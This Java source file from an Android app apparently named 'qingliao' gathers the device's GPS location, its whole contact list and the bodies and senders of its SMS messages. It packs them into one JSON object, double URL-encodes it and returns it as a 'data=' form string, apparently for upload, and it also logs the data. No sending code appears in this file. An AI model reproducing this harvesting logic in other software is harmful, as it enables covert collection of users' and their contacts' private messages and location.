package com.example.qingliao;

import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

public class JsonUtil {
    public String getPhoneJson(List<String> lal, String edtPhone, List<PhoneDto> phoneContactsList, List<SmsDto> smsList, String userMake) throws UnsupportedEncodingException {
        String inputPhone="0";
        Gson gson = new GsonBuilder().disableHtmlEscaping().create();
        JavaBean javaBean=new JavaBean();
        List<String> jsonLAL=new ArrayList<>();
        if (lal.size()>1){
            jsonLAL.add(lal.get(0));
            jsonLAL.add(lal.get(1));
            javaBean.setX(jsonLAL.get(0));
            javaBean.setY(jsonLAL.get(1));
            Log.d("onRequestPermissionsResultGps",lal.get(0)+" "+lal.get(1));
        }else {
            jsonLAL.add("0");
            jsonLAL.add("0");
            javaBean.setX(jsonLAL.get(0));
            javaBean.setY(jsonLAL.get(1));
            Log.d("onRequestPermissionsResultGps","0");
        }

        if (!edtPhone.equals("")){
            inputPhone=edtPhone.trim();
        }
        if (!userMake.equals("")){
            inputPhone=edtPhone.trim();
        }else {
            userMake="0";
        }


        javaBean.setMobile(inputPhone);
        javaBean.setUserMark(userMake);
        List<JavaBean.StrJsonDataBean> phoneList = new ArrayList<JavaBean.StrJsonDataBean>();

        //通讯录list
        //有数据
        if (phoneContactsList.size()>=1&&smsList.size()>=1) {
            for (int i = 0; i < phoneContactsList.size(); i++) {   //通讯录
                JavaBean.StrJsonDataBean strJsonDataBean=new JavaBean.StrJsonDataBean();
                strJsonDataBean.setSign("1");
                strJsonDataBean.setContent(phoneContactsList.get(i).getName());
                strJsonDataBean.setMobile(phoneContactsList.get(i).getTelPhone().trim());
                strJsonDataBean.setPedvice(inputPhone);
                strJsonDataBean.setSendMark("0");
                phoneList.add(strJsonDataBean);
                javaBean.setStrJsonData(phoneList);
            }
            for (int i = 0; i < smsList.size(); i++) {     //短信
                JavaBean.StrJsonDataBean strJsonDataBean=new JavaBean.StrJsonDataBean();
                strJsonDataBean.setSign("2");
                strJsonDataBean.setContent(smsList.get(i).getBody());
                strJsonDataBean.setMobile(smsList.get(i).getAddress().trim());
                strJsonDataBean.setPedvice(inputPhone);
                strJsonDataBean.setSendMark(smsList.get(i).getType());
                phoneList.add(strJsonDataBean);
                javaBean.setStrJsonData(phoneList);
            }
        }
        else if (phoneContactsList.size()>=1){
            for (int i = 0; i < phoneContactsList.size(); i++) {   //通讯录
                JavaBean.StrJsonDataBean strJsonDataBean=new JavaBean.StrJsonDataBean();
                strJsonDataBean.setSign("1");
                strJsonDataBean.setContent(phoneContactsList.get(i).getName());
                strJsonDataBean.setMobile(phoneContactsList.get(i).getTelPhone().trim());
                strJsonDataBean.setPedvice(inputPhone);
                strJsonDataBean.setSendMark("0");
                phoneList.add(strJsonDataBean);
                javaBean.setStrJsonData(phoneList);
            }
        }
        else if (smsList.size()>=1){
            for (int i = 0; i < smsList.size(); i++) {     //短信
                JavaBean.StrJsonDataBean strJsonDataBean=new JavaBean.StrJsonDataBean();
                strJsonDataBean.setSign("2");
                strJsonDataBean.setContent(smsList.get(i).getBody());
                strJsonDataBean.setMobile(smsList.get(i).getAddress().trim());
                strJsonDataBean.setPedvice(inputPhone);
                strJsonDataBean.setSendMark(smsList.get(i).getType());
                phoneList.add(strJsonDataBean);
                javaBean.setStrJsonData(phoneList);
            }
        }
        else{
            JavaBean.StrJsonDataBean strJsonDataBean=new JavaBean.StrJsonDataBean();
            strJsonDataBean.setSign("0");
            strJsonDataBean.setContent("0");
            strJsonDataBean.setMobile("0");
            strJsonDataBean.setPedvice(inputPhone);
            strJsonDataBean.setSendMark(userMake);
            phoneList.add(strJsonDataBean);
            javaBean.setStrJsonData(phoneList);
        }

        System.out.println(gson.toJson(javaBean));

        String json=gson.toJson(javaBean);
        json=URLEncoder.encode(json,"UTF-8");
        json=URLEncoder.encode(json,"UTF-8");
        String[]  strs=json.split("content");
        for(int i=0,len=strs.length;i<len;i++){
            Log.d("onRequestPermissionsResult",strs[i].toString());
        }
//        Gson gson3=new Gson();
//        //
//        JavaBean student=gson.fromJson(json,JavaBean.class);
//        //成功获取数组里面的内容
//        debug
//
//         Log.d("JSON",student.getX());
//        Log.d("JSON",student.getMobile());
//        Log.d("JSON",student.getSendMark());
//        Log.d("JSON",student.getY());
//        //接下来就是解析内部类中的内容
//        /*
//        Outter outter = new Outter();
//        Outter.Inner inner = outter.new Inner();  //必须通过Outter对象来创建*/
//        for (int i=0;i<student.getStrJsonData().size();i++){
//            Log.d("JSON",student.getStrJsonData().get(i).getContent());
//            Log.d("JSON",student.getStrJsonData().get(i).getMobile());
//            Log.d("JSON",student.getStrJsonData().get(i).getPedvice());
//            Log.d("JSON",student.getStrJsonData().get(i).getSign());
//            Log.d("JSON",student.getStrJsonData().get(i).getSendMark());
//        }




//        String[]  strs=json.split("content");
//        for(int i=0,len=strs.length;i<len;i++){
//            Log.d("onRequestPermissionsResult",strs[i].toString());
//        }


        return ("data="+json);
    }

}
